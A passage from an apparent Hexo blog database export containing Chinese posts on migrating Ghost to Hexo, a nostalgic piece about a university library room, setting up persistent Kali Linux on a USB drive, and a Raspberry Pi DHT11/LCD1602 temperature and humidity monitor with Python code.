第四步\n将json文件放到根目录，并且执行：\n\n```\nhexo migrate ghost source.json  \nhexo clean ; hexo d -g \n```\n\n# 注意\n经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：\n* HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的\n* tag可能会出问题，会自动加--，请自行删除，或者批量删除","slug":"GHOST搬迁到HEXO-Github-Pages-指南","published":1,"updated":"2016-11-19T11:35:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym301a001ccdonqed16spk","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。</p>\n<p>但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。</p>\n<h1 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h1><p>在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：</p>\n<ul>\n<li>安装HEXO</li>\n<li>配置Github</li>\n</ul>\n<h1 id=\"搬家\"><a href=\"#搬家\" class=\"headerlink\" title=\"搬家\"></a>搬家</h1><h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>Ghost导出数据json：实验室-导出，下载好json</p>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>安装搬家工具<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm i hexo-migrator-ghost --save</div></pre></td></tr></table></figure></p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>修改<code>./scaffolds/post.md</code>文件内容为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">title: &#123;&#123; title &#125;&#125;  </div><div class=\"line\">date: &#123;&#123; date &#125;&#125;  </div><div class=\"line\">tags: &#123;&#123; tags &#125;&#125;  </div><div class=\"line\">---</div></pre></td></tr></table></figure>\n<h2 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h2><p>将json文件放到根目录，并且执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo migrate ghost source.json  </div><div class=\"line\">hexo clean ; hexo d -g</div></pre></td></tr></table></figure>\n<h1 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h1><p>经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：</p>\n<ul>\n<li>HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的</li>\n<li>tag可能会出问题，会自动加–，请自行删除，或者批量删除</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>想了很长时间，权衡了一下利弊，还是觉得Github Pages平台会好一些，虽然可能我用了几天就会被和谐掉。</p>\n<p>但是GHOST还需要找专门能够运行Node的平台，在这方面，全静态的HEXO绝对是博客的首选。</p>\n<h1 id=\"前提\"><a href=\"#前提\" class=\"headerlink\" title=\"前提\"></a>前提</h1><p>在搬家之前，首先你要有一个Github，或者Gitlab，本文不过多叙述：</p>\n<ul>\n<li>安装HEXO</li>\n<li>配置Github</li>\n</ul>\n<h1 id=\"搬家\"><a href=\"#搬家\" class=\"headerlink\" title=\"搬家\"></a>搬家</h1><h2 id=\"第一步\"><a href=\"#第一步\" class=\"headerlink\" title=\"第一步\"></a>第一步</h2><p>Ghost导出数据json：实验室-导出，下载好json</p>\n<h2 id=\"第二步\"><a href=\"#第二步\" class=\"headerlink\" title=\"第二步\"></a>第二步</h2><p>安装搬家工具<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">npm i hexo-migrator-ghost --save</div></pre></td></tr></table></figure></p>\n<h2 id=\"第三步\"><a href=\"#第三步\" class=\"headerlink\" title=\"第三步\"></a>第三步</h2><p>修改<code>./scaffolds/post.md</code>文件内容为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">title: &#123;&#123; title &#125;&#125;  </div><div class=\"line\">date: &#123;&#123; date &#125;&#125;  </div><div class=\"line\">tags: &#123;&#123; tags &#125;&#125;  </div><div class=\"line\">---</div></pre></td></tr></table></figure>\n<h2 id=\"第四步\"><a href=\"#第四步\" class=\"headerlink\" title=\"第四步\"></a>第四步</h2><p>将json文件放到根目录，并且执行：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">hexo migrate ghost source.json  </div><div class=\"line\">hexo clean ; hexo d -g</div></pre></td></tr></table></figure>\n<h1 id=\"注意\"><a href=\"#注意\" class=\"headerlink\" title=\"注意\"></a>注意</h1><p>经过以上步骤，基本上是搬家完毕了，但是仍有一些需要注意的：</p>\n<ul>\n<li>HEXO的Markdown语法比较严谨，所以倒入进来会存在问题，需要进一步修正，比如#如果前面不空格是不解析标题的</li>\n<li>tag可能会出问题，会自动加–，请自行删除，或者批量删除</li>\n</ul>\n"},{"title":"我怀念的依旧是916","id":"13","updated":"2016-08-21T00:09:45.000Z","date":"2016-08-20T22:22:01.000Z","_content":"\n本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。\n\n所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。\n\n916桌子很多，却都是空位，但是有基友陪伴。\n<!-- more --> \n![](/content/images/2016/08/IMG_0052.JPG)\n\n916有dong dong dong，充满回忆。\n![](/content/images/2016/08/IMG_0310.JPG)\n![](/content/images/2016/08/IMG_0798.JPG)\n\n916从来不用占座，却可以假装学习。\n![](/content/images/2016/08/IMG_1133.JPG)\n![](/content/images/2016/08/IMG_1131.JPG)\n\n916通宵加零食，空调WI-FI感觉人生圆满了。\n![](/content/images/2016/08/IMG_0912.JPG)\n\n916有沙发有地铺，住在学校里的快捷酒店。\n![](/content/images/2016/08/IMG_0459.JPG)\n\n916极大地方便了生活，Linux的帮忙少不了。\n![](/content/images/2016/08/IMG_0502-1.JPG)\n\n或许我想念的并不是不太优越的办公环境，而是那种感觉。\n\n炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。\n\n自由自在，想做什么做什么。\n\n当然，我也不会忘记，\n\n偷偷的把被子塞到书包里，绕过防火墙的经历；\n\n第二天起床去厕所刷牙碰到老师，被吓住的心情；\n\n晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；\n\n十点后进入害怕遇到搜查，爬九楼的故事；\n\n隔壁传来的dongdongdong声音和30GB的故事。\n\n","source":"_posts/我怀念的依旧是916.md","raw":"---\ntitle: 我怀念的依旧是916\ntags: '杂谈'\npermalink: '916'\nid: 13\nupdated: '2016-08-21 01:09:45'\ndate: 2016-08-20 23:22:01\n---\n\n本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。\n\n所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。\n\n916桌子很多，却都是空位，但是有基友陪伴。\n<!-- more --> \n![](/content/images/2016/08/IMG_0052.JPG)\n\n916有dong dong dong，充满回忆。\n![](/content/images/2016/08/IMG_0310.JPG)\n![](/content/images/2016/08/IMG_0798.JPG)\n\n916从来不用占座，却可以假装学习。\n![](/content/images/2016/08/IMG_1133.JPG)\n![](/content/images/2016/08/IMG_1131.JPG)\n\n916通宵加零食，空调WI-FI感觉人生圆满了。\n![](/content/images/2016/08/IMG_0912.JPG)\n\n916有沙发有地铺，住在学校里的快捷酒店。\n![](/content/images/2016/08/IMG_0459.JPG)\n\n916极大地方便了生活，Linux的帮忙少不了。\n![](/content/images/2016/08/IMG_0502-1.JPG)\n\n或许我想念的并不是不太优越的办公环境，而是那种感觉。\n\n炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。\n\n自由自在，想做什么做什么。\n\n当然，我也不会忘记，\n\n偷偷的把被子塞到书包里，绕过防火墙的经历；\n\n第二天起床去厕所刷牙碰到老师，被吓住的心情；\n\n晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；\n\n十点后进入害怕遇到搜查，爬九楼的故事；\n\n隔壁传来的dongdongdong声音和30GB的故事。\n\n","slug":"916","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym301c001ecdonu7jpilkj","content":"<p>本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。</p>\n<p>所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。</p>\n<p>916桌子很多，却都是空位，但是有基友陪伴。<br><a id=\"more\"></a><br><img src=\"/content/images/2016/08/IMG_0052.JPG\" alt=\"\"></p>\n<p>916有dong dong dong，充满回忆。<br><img src=\"/content/images/2016/08/IMG_0310.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_0798.JPG\" alt=\"\"></p>\n<p>916从来不用占座，却可以假装学习。<br><img src=\"/content/images/2016/08/IMG_1133.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_1131.JPG\" alt=\"\"></p>\n<p>916通宵加零食，空调WI-FI感觉人生圆满了。<br><img src=\"/content/images/2016/08/IMG_0912.JPG\" alt=\"\"></p>\n<p>916有沙发有地铺，住在学校里的快捷酒店。<br><img src=\"/content/images/2016/08/IMG_0459.JPG\" alt=\"\"></p>\n<p>916极大地方便了生活，Linux的帮忙少不了。<br><img src=\"/content/images/2016/08/IMG_0502-1.JPG\" alt=\"\"></p>\n<p>或许我想念的并不是不太优越的办公环境，而是那种感觉。</p>\n<p>炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。</p>\n<p>自由自在，想做什么做什么。</p>\n<p>当然，我也不会忘记，</p>\n<p>偷偷的把被子塞到书包里，绕过防火墙的经历；</p>\n<p>第二天起床去厕所刷牙碰到老师，被吓住的心情；</p>\n<p>晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；</p>\n<p>十点后进入害怕遇到搜查，爬九楼的故事；</p>\n<p>隔壁传来的dongdongdong声音和30GB的故事。</p>\n","excerpt":"<p>本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。</p>\n<p>所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。</p>\n<p>916桌子很多，却都是空位，但是有基友陪伴。<br>","more":"<br><img src=\"/content/images/2016/08/IMG_0052.JPG\" alt=\"\"></p>\n<p>916有dong dong dong，充满回忆。<br><img src=\"/content/images/2016/08/IMG_0310.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_0798.JPG\" alt=\"\"></p>\n<p>916从来不用占座，却可以假装学习。<br><img src=\"/content/images/2016/08/IMG_1133.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_1131.JPG\" alt=\"\"></p>\n<p>916通宵加零食，空调WI-FI感觉人生圆满了。<br><img src=\"/content/images/2016/08/IMG_0912.JPG\" alt=\"\"></p>\n<p>916有沙发有地铺，住在学校里的快捷酒店。<br><img src=\"/content/images/2016/08/IMG_0459.JPG\" alt=\"\"></p>\n<p>916极大地方便了生活，Linux的帮忙少不了。<br><img src=\"/content/images/2016/08/IMG_0502-1.JPG\" alt=\"\"></p>\n<p>或许我想念的并不是不太优越的办公环境，而是那种感觉。</p>\n<p>炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。</p>\n<p>自由自在，想做什么做什么。</p>\n<p>当然，我也不会忘记，</p>\n<p>偷偷的把被子塞到书包里，绕过防火墙的经历；</p>\n<p>第二天起床去厕所刷牙碰到老师，被吓住的心情；</p>\n<p>晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；</p>\n<p>十点后进入害怕遇到搜查，爬九楼的故事；</p>\n<p>隔壁传来的dongdongdong声音和30GB的故事。</p>"},{"title":"把KALI放到U盘里","id":"16","updated":"2016-08-25T18:29:38.000Z","date":"2016-08-25T18:26:45.000Z","_content":"\n步骤1：进入 bios设置U盘启动，保存并启动电脑\n\n步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。\n<!-- more --> \n步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。\n\n关掉gparted ，在命令行里输入以下命令：\n\n```bash\nmkdir /mnt/usb\nmount /dev/sdb2 /mnt/usb\necho \"/ union\" >> /mnt/usb/persistence.conf\numount /mnt/usb\n```","source":"_posts/把KALI放到U盘里.md","raw":"---\ntitle: 把KALI放到U盘里\ntags: 'Linux'\npermalink: ba-kalifang-dao-upan-li\nid: 16\nupdated: '2016-08-25 19:29:38'\ndate: 2016-08-25 19:26:45\n---\n\n步骤1：进入 bios设置U盘启动，保存并启动电脑\n\n步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。\n<!-- more --> \n步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。\n\n关掉gparted ，在命令行里输入以下命令：\n\n```bash\nmkdir /mnt/usb\nmount /dev/sdb2 /mnt/usb\necho \"/ union\" >> /mnt/usb/persistence.conf\numount /mnt/usb\n```","slug":"ba-kalifang-dao-upan-li","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"civym301e001icdon14f12do6","content":"<p>步骤1：进入 bios设置U盘启动，保存并启动电脑</p>\n<p>步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。<br><a id=\"more\"></a><br>步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。</p>\n<p>关掉gparted ，在命令行里输入以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">mkdir /mnt/usb</div><div class=\"line\">mount /dev/sdb2 /mnt/usb</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"/ union\"</span> &gt;&gt; /mnt/usb/persistence.conf</div><div class=\"line\">umount /mnt/usb</div></pre></td></tr></table></figure>","excerpt":"<p>步骤1：进入 bios设置U盘启动，保存并启动电脑</p>\n<p>步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。<br>","more":"<br>步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。</p>\n<p>关掉gparted ，在命令行里输入以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">mkdir /mnt/usb</div><div class=\"line\">mount /dev/sdb2 /mnt/usb</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"/ union\"</span> &gt;&gt; /mnt/usb/persistence.conf</div><div class=\"line\">umount /mnt/usb</div></pre></td></tr></table></figure>"},{"title":"基于树莓派的实时温度湿度监测平台","id":"15","updated":"2016-08-25T18:28:59.000Z","date":"2016-08-25T12:39:08.000Z","_content":"\n\n# 前言\n很早就入了树莓派，一直没有折腾GPIO功能，虽然我是学自动化的，但是我对引脚之类的一窍不通，做这个也是为了预习一下本专业的知识，而更多的，是乐趣。\n\n在淘宝上网购了原料之后，回家发现网上并没有树莓派3B的教程，大部分都是树莓派2B的教程，而树莓派3B的GPIO图都发生了变化，因此写本文的目的还在于帮助更多的人，填补互联网的空白。\n<!-- more --> \n# 知识储备\n* 数字电子技术基础\n* 微机原理与接口技术\n* python语言\n\n# 原料\n* 树莓派3B\n* DHT11\n* LCD1602\n* 2K电阻（也可以是电位器）\n* 子-母 和 母-母 杜邦线\n* 电气绝缘胶带\n* 剪刀\n* 一颗耐心和一颗细心\n\n# 语言\n* Python 2.7\n\n# 组件\n* python-dev\n* python-rpi.gpio\n如果不具备以上，请执行：\n```bash\nsudo apt-get update\nsudo apt-get install python-dev\nsudo apt-get install python-rpi.gpio\n```\n\n# 接线\n我们一共要完成两个任务：\n\n* 1.连接LCD1602\n* 2.连接DHT11\n\n树莓派3B的GPIO图如下：\n\n![](/content/images/2016/08/GPIO.png)\n##  2K 电阻如何连接到电路\n简单粗暴的方法就是把电阻两头连接到两个子-母杜邦线上，然后用绝缘胶布缠上，非常方便美观。\n\n## LCD1602 接线方案\n\nLCD 与 树莓派相连 方案图，2K电阻是我自行设计，如果有电位器最好放置电位器：\n![](/content/images/2016/08/LCD1602--.jpg)\n\n树莓派的USB端口朝下，电源线位置朝上方向摆放。\n右端一共有40个引脚，每个引脚的PIN位置如上。\n\nVSS，接地，RPi PIN 6\nVDD，接5V电源，PRi PIN 2\nVO，液晶对比度调节，接1K 电阻，另一端相连接地，PIN 9\nRS，寄存器选择，接GPIO 14，RPi PIN 8\nRW，读写选择，接地，表示写模式，PRi PIN 6\nE，使能信号，接GPIO 15，RPi PIN 10\nD0，数据位0，4位工作模式下不用，不接\nD1，数据位1，4位工作模式下不用，不接\nD2，数据位2，4位工作模式下不用，不接\nD3，数据位3，4位工作模式下不用，不接\nD4，数据位4，接GPIO 17，RPi PIN 11\nD5，数据位5，接GPIO 18，RPi PIN 12\nD6，数据位6，接GPIO 27，RPi PIN 13\nD7，数据位7，接GPIO 22，RPi PIN 15\nA，液晶屏背光+，接5V，RPi PIN 4\nK，液晶屏背光-，接地，RPi PIN 39\n\n**连接好后，务必要仔细检查是否连接正确，以防开机烧坏GPIO甚至树莓派。**\n\n建议在关机情况下接线，如果在开机情况下接线，VDD请最后连接。\n\n## LCD1602 开机测试\n接通电源线，默认情况下，如果连接正确：\n\n* 肯定没有爆炸\n* 会出现如下图的效果，证明你已经接线成功了\n![](/content/images/2016/08/1.jpg)\n\n## DHT11 接线方案\n接线简单，主要是把数据传输到GPIO26上\n\nDHT11有3个脚，VCC，DATA，GND\nVCC 接 3.3V PIN 01\nDATA 接 GPIO26 PIN 37\nGND 接地  PIN 09\n\n#代码\n采用python语言编写，由于html对tab和空格的支持不好，复制容易产生编译问题，代码已经传到github\n\nhttps://github.com/yfgeek/rpi-TmpHmdRuntime\n```python\n#!/usr/bin/python\n\n# based on code from hugozhu/CharLCD.py https://gist.github.com/hugozhu/6166527\n# rewrite by ivan\n\nfrom time import sleep\nfrom datetime import datetime\nfrom time import sleep\nimport commands,time\nimport RPi.GPIO as GPIO\n\ndef get_tmp():\n  channel = 37\n  data = []\n  j = 0\n\n  GPIO.setmode(GPIO.BOARD)\n\n  time.sleep(1)\n\n  GPIO.setup(channel, GPIO.OUT)\n  GPIO.output(channel, GPIO.LOW)\n  time.sleep(0.5)\n  GPIO.output(channel, GPIO.HIGH)\n  GPIO.setup(channel, GPIO.IN)\n\n  while GPIO.input(channel) == GPIO.LOW:\n    continue\n  while GPIO.input(channel) == GPIO.HIGH:\n    continue\n\n  while j < 40:\n    k = 0\n    while GPIO.input(channel) == GPIO.LOW:\n      continue\n    while GPIO.input(channel) == GPIO.HIGH:\n      k += 1\n      if k > 100:\n        break\n    if k < 8:\n      data.append(0)\n    else:\n      data.append(1)\n\n    j += 1\n\n  print \"sensor is working.\"\n  print data\n\n  humidity_bit = data[0:8]\n  humidity_point_bit = data[8:16]\n  temperature_bit = data[16:24]\n  temperature_point_bit = data[24:32]\n  check_bit = data[32:40]\n\n  humidity = 0\n  humidity_point = 0\n  temperature = 0\n  temperature_point = 0\n  check = 0\n\n  for i in range(8):\n    humidity += humidity_bit[i] * 2 ** (7-i)\n    humidity_point += humidity_point_bit[i] * 2 ** (7-i)\n    temperature += temperature_bit[i] * 2 ** (7-i)\n    temperature_point += temperature_point_bit[i] * 2 ** (7-i)\n    check += check_bit[i] * 2 ** (7-i)\n\n  tmp = humidity + humidity_point + temperature + temperature_point\n\n  if check == tmp:\n    return 'temp:' + str(temperature) + ' C \\nhumidity:' + str(humidity) + '%'\n  else:\n    get_tmp()\n\n  GPIO.cleanup()    \n\nclass Adafruit_CharLCD:\n\n    # commands\n    LCD_CLEARDISPLAY            = 0x01\n    LCD_RETURNHOME                  = 0x02\n    LCD_ENTRYMODESET            = 0x04\n    LCD_DISPLAYCONTROL          = 0x08\n    LCD_CURSORSHIFT             = 0x10\n    LCD_FUNCTIONSET             = 0x20\n    LCD_SETCGRAMADDR            = 0x40\n    LCD_SETDDRAMADDR            = 0x80\n\n    # flags for display entry mode\n    LCD_ENTRYRIGHT              = 0x00\n    LCD_ENTRYLEFT               = 0x02\n    LCD_ENTRYSHIFTINCREMENT     = 0x01\n    LCD_ENTRYSHIFTDECREMENT     = 0x00\n\n    # flags for display on/off control\n    LCD_DISPLAYON               = 0x04\n    LCD_DISPLAYOFF              = 0x00\n    LCD_CURSORON                = 0x02\n    LCD_CURSOROFF               = 0x00\n    LCD_BLINKON                 = 0x01\n    LCD_BLINKOFF                = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n\n    # flags for display/cursor shift\n    LCD_DISPLAYMOVE             = 0x08\n    LCD_CURSORMOVE              = 0x00\n    LCD_MOVERIGHT               = 0x04\n    LCD_MOVELEFT                = 0x00\n\n    # flags for function set\n    LCD_8BITMODE                = 0x10\n    LCD_4BITMODE                = 0x00\n    LCD_2LINE                   = 0x08\n    LCD_1LINE                   = 0x00\n    LCD_5x10DOTS                = 0x04\n    LCD_5x8DOTS                 = 0x00\n\n\n\n    def __init__(self, pin_rs=8, pin_e=10, pins_db=[11,12,13,15], GPIO = None):\n        # Emulate the old behavior of using RPi.GPIO if we haven't been given\n        # an explicit GPIO interface to use\n        if not GPIO:\n            import RPi.GPIO as GPIO\n        GPIO.setwarnings(False)\n\n        self.GPIO = GPIO\n        self.pin_rs = pin_rs\n        self.pin_e = pin_e\n        self.pins_db = pins_db\n\n        self.GPIO.setmode(GPIO.BOARD)\n        self.GPIO.setup(self.pin_e, GPIO.OUT)\n        self.GPIO.setup(self.pin_rs, GPIO.OUT)\n\n        for pin in self.pins_db:\n            self.GPIO.setup(pin, GPIO.OUT)\n\n        self.write4bits(0x33) # initialization\n        self.write4bits(0x32) # initialization\n        self.write4bits(0x28) # 2 line 5x7 matrix\n        self.write4bits(0x0C) # turn cursor off 0x0E to enable cursor\n        self.write4bits(0x06) # shift cursor right\n\n        self.displaycontrol = self.LCD_DISPLAYON | self.LCD_CURSOROFF | self.LCD_BLINKOFF\n\n        self.displayfunction = self.LCD_4BITMODE | self.LCD_1LINE | self.LCD_5x8DOTS\n        self.displayfunction |= self.LCD_2LINE\n\n        \"\"\" Initialize to default text direction (for romance languages) \"\"\"\n        self.displaymode =  self.LCD_ENTRYLEFT | self.LCD_ENTRYSHIFTDECREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode) #  set the entry mode\n\n        self.clear()\n\n\n    def begin(self, cols, lines):\n\n        if (lines > 1):\n                self.numlines = lines\n                self.displayfunction |= self.LCD_2LINE\n                self.currline = 0\n\n\n    def home(self):\n\n        self.write4bits(self.LCD_RETURNHOME) # set cursor position to zero\n        self.delayMicroseconds(3000) # this command takes a long time!\n\n\n    def clear(self):\n\n        self.write4bits(self.LCD_CLEARDISPLAY) # command to clear display\n        self.delayMicroseconds(3000)    # 3000 microsecond sleep, clearing the display takes a long time\n\n\n    def setCursor(self, col, row):\n\n        self.row_offsets = [ 0x00, 0x40, 0x14, 0x54 ]\n\n        if ( row > self.numlines ): \n                row = self.numlines - 1 # we count rows starting w/0\n\n        self.write4bits(self.LCD_SETDDRAMADDR | (col + self.row_offsets[row]))\n\n\n    def noDisplay(self): \n        \"\"\" Turn the display off (quickly) \"\"\"\n\n        self.displaycontrol &= ~self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def display(self):\n        \"\"\" Turn the display on (quickly) \"\"\"\n\n        self.displaycontrol |= self.LCD_DISPLAYON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noCursor(self):\n        \"\"\" Turns the underline cursor on/off \"\"\"\n\n        self.displaycontrol &= ~self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def cursor(self):\n        \"\"\" Cursor On \"\"\"\n\n        self.displaycontrol |= self.LCD_CURSORON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def noBlink(self):\n        \"\"\" Turn on and off the blinking cursor \"\"\"\n\n        self.displaycontrol &= ~self.LCD_BLINKON\n        self.write4bits(self.LCD_DISPLAYCONTROL | self.displaycontrol)\n\n\n    def DisplayLeft(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVELEFT)\n\n\n    def scrollDisplayRight(self):\n        \"\"\" These commands scroll the display without changing the RAM \"\"\"\n\n        self.write4bits(self.LCD_CURSORSHIFT | self.LCD_DISPLAYMOVE | self.LCD_MOVERIGHT);\n\n\n    def leftToRight(self):\n        \"\"\" This is for text that flows Left to Right \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode);\n\n\n    def rightToLeft(self):\n        \"\"\" This is for text that flows Right to Left \"\"\"\n        self.displaymode &= ~self.LCD_ENTRYLEFT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def autoscroll(self):\n        \"\"\" This will 'right justify' text from the cursor \"\"\"\n\n        self.displaymode |= self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def noAutoscroll(self): \n        \"\"\" This will 'left justify' text from the cursor \"\"\"\n\n        self.displaymode &= ~self.LCD_ENTRYSHIFTINCREMENT\n        self.write4bits(self.LCD_ENTRYMODESET | self.displaymode)\n\n\n    def write4bits(self, bits, char_mode=False):\n        \"\"\" Send command to LCD \"\"\"\n\n        self.delayMicroseconds(1000) # 1000 microsecond sleep\n\n        bits=bin(bits)[2:].zfill(8)\n\n        self.GPIO.output(self.pin_rs, char_mode)\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i], True)\n\n        self.pulseEnable()\n\n        for pin in self.pins_db:\n            self.GPIO.output(pin, False)\n\n        for i in range(4,8):\n            if bits[i] == \"1\":\n                self.GPIO.output(self.pins_db[::-1][i-4], True)\n\n        self.pulseEnable()\n\n\n    def delayMicroseconds(self, microseconds):\n        seconds = microseconds / float(1000000) # divide microseconds by 1 million for seconds\n        sleep(seconds)\n\n\n    def pulseEnable(self):\n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, True)\n        self.delayMicroseconds(1)               # 1 microsecond pause - enable pulse must be > 450ns \n        self.GPIO.output(self.pin_e, False)\n        self.delayMicroseconds(1)               # commands need > 37us to settle\n\n\n    def message(self, text):\n        \"\"\" Send string to LCD. Newline wraps to second line\"\"\"\n\n        for char in text:\n            if char == '\\n':\n                self.write4bits(0xC0) # next line\n            else:\n                self.write4bits(ord(char),True)\n\nif __name__ == '__main__':\n\n    while True:\n        tmp = get_tmp() \n        if tmp:\n            lcd = Adafruit_CharLCD()\n            lcd.noBlink()\n            lcd.clear()\n            lcd.message(tmp)\n        sleep(5)\n\n```\n# 运行效果\n![](/content/images/2016/08/WechatIMG302.jpeg)\n\n\n![](/content/images/2016/08/WechatIMG293.jpeg)\n# 